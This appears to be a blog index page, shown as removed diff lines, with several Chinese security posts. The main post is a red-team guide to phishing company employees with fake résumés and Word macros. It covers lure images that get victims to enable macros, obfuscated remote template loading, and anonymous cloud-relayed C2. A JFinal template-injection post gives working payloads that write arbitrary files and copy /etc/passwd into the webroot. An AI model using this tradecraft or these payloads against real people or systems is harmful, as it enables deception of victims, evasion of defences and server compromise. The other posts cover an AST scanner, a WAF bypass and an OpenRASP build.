-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>前段时间有幸向一位师傅学习钓鱼手法，而钓鱼也是一门比较深的手艺，在笔者目前看来，涉及到社会工程（语言技巧、诱导欺骗）、样本免杀（包括过邮件沙箱、邮件网关、终端EDR免杀等）、C2（云函数、云转发、能否出网）等。尤其在大公司中，对于邮件钓鱼已经有较多的防范，我们前期的样本制作就更需要费一番心思。</p>
-<p>笔者使用GadgetToJScript + ColbatStrike 的方式进行木马制作，钓鱼手法为word宏+图片诱导+远程模板加载+hta命令执行，在近期red team行动中也成功钓到重要公司的的员工。 </p>
-<p>本文主要描写笔者如何进行word宏邮件钓鱼，记录笔者的一些心得，也是一篇笔记。</p>
-<h2 id="确定目标"><a href="#确定目标" class="headerlink" title="确定目标"></a>确定目标</h2><p>知道目标公司后，笔者通常喜欢通过投递简历的方式进行钓鱼，其中较为麻烦的就是简历编造的这一过程了，有时需要写得华丽、专业，有时需要写得朴素、简单，根据岗位投其所好，实乃耗费精力。有人对我说简历上不必花费过多精力，只要有人点击[启用]即可，不必管太多。但笔者认为，一方面，合理的简历可以降低鱼儿的警惕，避免让其发现异常找”网关“，而如果样本被分析，泄露C2了云转发地址，对我们这次的钓鱼行动是致命的。毕竟云服务供应商是有限的，公司安全运营人员一直在尝试封禁所有能利用的云转发地址，我们手头能利用的云服务商也见底了，即便见底后采用社交论坛C2回连方式也不太实用，不到万不得已我想没人喜欢这样玩。另外一方面，</p>
-<p>通过在google/baidu/soso(wechat)中搜索 ”xx招聘“ 等关键字，尽量搜寻个人邮箱，且时间上最好是近一个月的。而我们邮件钓鱼需要尽量避免向群邮件投递或者通过网站进行投递，群邮件投递容易被发现异常，网站投递可能会对word进行转换导致样本失效。</p>
-<p>搜寻信息过程中，将收集到到得信息先一一记录，并标注好招聘发布的时间、岗位、目标邮箱、岗位信息。</p>
-<h2 id="简历编写与投递"><a href="#简历编写与投递" class="headerlink" title="简历编写与投递"></a>简历编写与投递</h2><p>简历创建时，建议选择word官方模板”蓝色球简历“，它直接带有本地模板加载的res，方面我们后面直接修改为远程模板加载。</p>
-<p>简历模板样式建议参考BOSS直聘的在线简历模板。</p>
-<p>工作经历这块，可以在相关招聘网站中查找相关工作，直接修改为工作经历。</p>
-<p>简历投递时，邮件内的介绍十分重要，需要引起对方感兴趣，另外也为了避免被邮件网关判断为垃圾邮件。</p>
-<p><img src="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/4.png" alt></p>
-<h2 id="远程模板（宏）"><a href="#远程模板（宏）" class="headerlink" title="远程模板（宏）"></a>远程模板（宏）</h2><p>首先制作dotm，在word中新建一个空白文档，之后在此出编写vba脚本。此处的脚本主要作用是执行命令，进行后门植入与持久化工作。</p>
-<p><img src="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/1.png" alt></p>
-<p>另外，让人纠结的一点是，如果不添加诱导，通常是不大可能会有人上当的；而添加了诱导，会增加我们钓鱼行动暴露的风险。笔者通常会选择添加诱导点击，做法是在vba脚本中编写一段函数，用于自动删除前面文档前面两张图片，其中一种图片是简历得模糊图片，另外一张是提示用户启用宏。一旦用户启用宏后，脚本自动删除图片后，用户看到的是一封正常的简历。</p>
-<p>随后修改前面我们编写的简历（docx）的/word/_rels/settings.xml.rels文件，将其修改为远程加载，为了避免被检测，我们可以通过利用一些XML的特性来进行混淆，相关手法参考笔者的一些文章或者在互联网进行搜索即可。这里使用CP037进行混淆：</p>
-<p><img src="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/3.png" alt></p>
-<p><img src="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/2.png" alt></p>
-<h2 id="C2"><a href="#C2" class="headerlink" title="C2"></a>C2</h2><p>由于目标公司出网限制得十分严格，也对CDN域名前置做了严格的检测，且出于让C2匿名的目的，我们必须使用云转发类的云服务，对C2流量进行中转。</p>
-<p>通过搜寻”serveless”、“云函数”查找相关厂商，以下是目前笔者知晓的服务商：</p>
-<table>
-<thead>
-<tr>
-<th>服务商</th>
-<th>缺陷</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>腾讯云</td>
-<td></td>
-</tr>
-<tr>
-<td>阿里云</td>
-<td>无法匿名</td>
-</tr>
-<tr>
-<td>华为云</td>
-<td>需要营业执照</td>
-</tr>
-<tr>
-<td>平安云</td>
-<td>需要营业执照</td>
-</tr>
-<tr>
-<td>亚马逊云</td>
-<td></td>
-</tr>
-<tr>
-<td>微软云</td>
-<td></td>
-</tr>
-<tr>
-<td>vercel</td>
-<td></td>
-</tr>
-<tr>
-<td>七牛云？</td>
-<td></td>
-</tr>
-</tbody></table>
-<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>对于笔者这种愣头青，在钓鱼时比较痛苦的还是文章杜撰这块，其他方面还是比较欢乐的。</p>
-<p>另外，直接的外网入口迟迟无法拿到的情况下，通过钓鱼的方式拿到内网入口也让人稍许欣慰。</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/06/16/word%E5%AE%8F%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC-%E8%BF%9C%E7%A8%8B%E5%8A%A0%E8%BD%BD%E6%A8%A1%E6%9D%BF/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-开源AST实践" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/">开源AST实践</a>
-    </h1>
-  
-
-        
-        <a href="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/" class="archive-article-date">
-  	<time datetime="2021-06-16T02:31:10.872Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-06-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="开源AST实践-构建静态Java代码扫描器"><a href="#开源AST实践-构建静态Java代码扫描器" class="headerlink" title="开源AST实践-构建静态Java代码扫描器"></a>开源AST实践-构建静态Java代码扫描器</h3><p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/2.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/3.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/4.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/5.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/6.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/7.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/8.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/9.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/10.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/11.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/12.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/13.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/14.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/15.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/16.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/17.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/18.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/19.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/20.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/21.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/22.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/23.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/24.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/25.png" alt></p>
-<p><img src="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/26.png" alt></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/06/15/%E5%BC%80%E6%BA%90AST%E5%AE%9E%E8%B7%B5/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-WAF-Bypass-内容编码" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/">WAF-Bypass-内容编码</a>
-    </h1>
-  
-
-        
-        <a href="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/" class="archive-article-date">
-  	<time datetime="2021-05-31T15:01:19.804Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-05-31</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h3 id="WAF-Bypass-内容编码"><a href="#WAF-Bypass-内容编码" class="headerlink" title="WAF-Bypass-内容编码"></a>WAF-Bypass-内容编码</h3><p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/1.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/2.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/3.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/4.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/5.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/6.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/7.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/8.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/9.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/10.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/11.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/12.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/13.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/14.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/15.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/16.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/17.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/18.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/19.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/20.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/21.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/22.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/23.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/24.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/25.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/26.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/27.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/28.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/29.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/30.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/31.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/32.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/33.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/34.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/35.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/36.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/37.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/38.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/39.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/40.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/41.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/42.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/43.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/44.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/45.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/46.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/47.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/48.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/49.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/50.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/51.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/52.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/53.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/54.png" alt></p>
-<p><img src="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/55.png" alt></p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/05/31/WAF-Bypass-%E5%86%85%E5%AE%B9%E7%BC%96%E7%A0%81/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-JFinalCodeExecution" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/15/JFinalCodeExecution/">JFinalCodeExecution</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/15/JFinalCodeExecution/" class="archive-article-date">
-  	<time datetime="2021-04-15T14:09:06.103Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-15</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="JFinal-Code-Execution"><a href="#JFinal-Code-Execution" class="headerlink" title="JFinal Code Execution"></a>JFinal Code Execution</h1><p>JFinal is a Java Web framework with front-end rendering function. If its front-end template allows users to edit, it will cause code execution vulnerability. JFinal itself does some blacklist restrictions, but there are bypass problems.</p>
-<p>JFinal only allows users to invoke static methods, and in com.jfinal.template.expr.ast.MethodKit we can see JFinal do some blacklist to restrict code execution. After debugging, we found a total of 16 classes that were masked.</p>
-<p><img src="/2021/04/15/JFinalCodeExecution/block_class.png" alt></p>
-<p>But most Web applications contain a number of third-party libraries that are available in static methods.</p>
-<p>I have push an example on gihub  ( <a href="https://github.com/turn1tup/JFinalTest" target="_blank" rel="noopener">https://github.com/turn1tup/JFinalTest</a>), you can use this code example to understand  this vul.</p>
-<p>This is the Class  used to render a html page and which triggering holes.</p>
-<p><img src="/2021/04/15/JFinalCodeExecution/TestMain.png" alt></p>
-<p>We circumvented JFinal’s blacklist policy by using third-party libraries</p>
-<p>The POC can upload any file to any location of the server, we can write the SSH public key, timing task or webshell to  getshell</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#set(uri&#x3D;java.net.URI::create(&quot;https:&#x2F;&#x2F;github.com&#x2F;turn1tup&#x2F;JFinalTest&#x2F;blob&#x2F;main&#x2F;README.md&quot;))</span><br><span class="line">#set(url&#x3D;uri.toURL())</span><br><span class="line">#set(paths&#x3D;java.nio.file.Paths::get(&quot;D:&#x2F;&quot;, &quot;success.txt&quot;))</span><br><span class="line">#(org.apache.commons.io.file.PathUtils::copyFile(url, paths))</span><br></pre></td></tr></table></figure>
-
-<p>This POC can copy any file to any location of the server, and then we can access the file from http</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#set(srcFile&#x3D;java.nio.file.Paths::get(&quot;&#x2F;etc&#x2F;passwd&quot;))</span><br><span class="line">#set(dstPath&#x3D;java.nio.file.Paths::get(&quot;&#x2F;root&#x2F;starter&#x2F;webapp&#x2F;&quot;))</span><br><span class="line">#(org.apache.commons.io.file.PathUtils::copyFileToDirectory(srcFile, dstPath))</span><br></pre></td></tr></table></figure>
-
-<p>Use this POC the get the webapp dir.</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#set(fileSys&#x3D;java.nio.file.FileSystems::getDefault())</span><br></pre></td></tr></table></figure>
-
-<p>For example, JPress (<a href="https://github.com/JPressProjects/jpress" target="_blank" rel="noopener">https://github.com/JPressProjects/jpress</a>) is the  Web application that uses JFinal and has this code execution problem.</p>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/15/JFinalCodeExecution/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-OpenRASP学习笔记" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">OpenRASP学习笔记</a>
-    </h1>
-  
-
-        
-        <a href="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-09-06T17:51:28.223Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-06</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="1-引言"><a href="#1-引言" class="headerlink" title="1.引言"></a>1.引言</h1><p>最近看了看OpenRASP（JAVA版），而网上关于OpenRASP已有一些文章，但纸上得来终觉浅，自己阅读一番再另外写篇文章，也还行，算是总结算是笔记。如文中有错误，还望同学们指出，十分感谢。</p>
-<h1 id="2-阅读前准备工作"><a href="#2-阅读前准备工作" class="headerlink" title="2.阅读前准备工作"></a>2.阅读前准备工作</h1><p>一开始还需要将open-rasp安装到Tomcat，这里按照官方文档指引即可。</p>
-<h2 id="2-1编译"><a href="#2-1编译" class="headerlink" title="2.1编译"></a>2.1编译</h2><h3 id="编译V8引擎"><a href="#编译V8引擎" class="headerlink" title="编译V8引擎"></a>编译V8引擎</h3><p>笔者在这里花了半天时间，一度十分懵逼，不懂C++编译这块的东西，按照官方文档来弄又不得行。</p>
-<p>笔者的编译环境</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Debian 4.9.18 (kali)</span><br><span class="line">OpenJDK 1.8</span><br><span class="line">gcc version 8.3.0</span><br></pre></td></tr></table></figure>
-
-<p>编译获取v8引擎jar包：</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">curl -L  https:&#x2F;&#x2F;github.com&#x2F;Kitware&#x2F;CMake&#x2F;releases&#x2F;download&#x2F;v3.15.3&#x2F;cmake-3.15.3-Linux-x86_64.tar.gz | tar zx -C &#x2F;tmp</span><br><span class="line">export PATH&#x3D;&#x2F;tmp&#x2F;cmake-3.15.3-Linux-x86_64&#x2F;bin:$PATH</span><br><span class="line"></span><br><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;baidu-security&#x2F;openrasp-v8.git</span><br><span class="line">~&#x2F;openrasp-v8# mkdir -p openrasp-v8&#x2F;build64 &amp;&amp; cd openrasp-v8&#x2F;build64</span><br><span class="line">~&#x2F;openrasp-v8&#x2F;openrasp-v8# cmake -DCMAKE_BUILD_TYPE&#x3D;RelWithDebInfo -DENABLE_LANGUAGES&#x3D;java ..</span><br><span class="line">~&#x2F;openrasp-v8&#x2F;openrasp-v8# make</span><br><span class="line">~&#x2F;openrasp-v8&#x2F;openrasp-v8# mkdir -p ..&#x2F;java&#x2F;src&#x2F;main&#x2F;resources&#x2F;natives&#x2F;linux_64 &amp;&amp; cp java&#x2F;libopenrasp_v8_java.so $_</span><br><span class="line">~&#x2F;openrasp-v8&#x2F;java# mvn install</span><br></pre></td></tr></table></figure>
-
-<h3 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h3><p>本文使用的是<code>1.3.4</code>版本。</p>
-<p>Injellij IDEA打开 \openrasp-master\agent\java</p>
-<p>Help &gt; Find Action ，输入并打开 <code>Maven Project</code></p>
-<p>由于V8是在虚拟机上编译的，不在本地物理机的maven仓库中，需要先将其加入仓库</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn install:install-file -Dfile&#x3D;D:\share\v8-1.0-SNAPSHOT.jar -DgroupId&#x3D;com.baidu.openrasp -DartifactId&#x3D;v8 -Dpackaging&#x3D;jar -Dversion&#x3D;1.0-SNAPSHOT</span><br></pre></td></tr></table></figure>
-
-<p>编译<code>rasp-boot</code></p>
-<p><img src="/2020/09/06/OpenRASP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/compile.png" alt></p>
-<p>由于<code>rasp-engine</code>依赖<code>rasp-boot</code>，所以需要将<code>rasp-boot</code>加入到maven仓库中</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">mvn install:install-file -Dfile&#x3D;D:\turn1tup\program_java\RASP\openrasp\agent\java\boot\target\rasp-boot-1.3.4-shaded.jar -DgroupId&#x3D;com.baidu.openrasp -DartifactId&#x3D;rasp-boot -Dpackaging&#x3D;jar -Dversion&#x3D;1.3.4</span><br></pre></td></tr></table></figure>
-
-<p>同样操作编译<code>rasp-engine</code>即可。</p>
-<h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>Windows下，在Tomcat的catalina.bat的open-rasp配置后添加一行JDWP配置：</p>
